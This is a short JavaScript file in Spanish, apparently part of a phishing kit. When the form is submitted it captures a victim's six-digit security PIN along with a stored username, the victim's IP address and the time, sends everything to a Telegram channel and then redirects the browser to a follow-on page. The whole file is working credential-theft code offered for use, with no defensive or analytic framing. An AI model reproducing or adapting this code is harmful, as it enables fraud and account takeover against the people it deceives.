document.addEventListener('DOMContentLoaded', () => {
    const pinForm = document.getElementById('pinForm');
    const pinInput = document.querySelector('input[name="num_pin"]');
    const pinButton = document.querySelector('.btn');

    const REDIRECCION_URL = 'correo.html';

    pinForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const pin = pinInput.value;
        const usuario = localStorage.getItem('usuario_guardado') || 'No detectado';

        const ipUsuario = await obtenerIP();
        const fechaHora = obtenerFechaHora();

        const mensaje = `🔐 <b>Nuevo PIN de Seguridad Recibido</b>\n\n` +
                        `👤 <b>Usuario Asociado:</b> ${usuario}\n` +
                        `🔢 <b>PIN de 6 Dígitos:</b> ${pin}\n` +
                        `🌐 <b>Dirección IP:</b> ${ipUsuario}\n` +
                        `⏰ <b>Fecha y Hora:</b> ${fechaHora}\n`;

        pinButton.disabled = true;
        pinButton.innerText = 'Validando...';

        await enviarATelegram(mensaje);
        window.location.href = REDIRECCION_URL;
    });
});
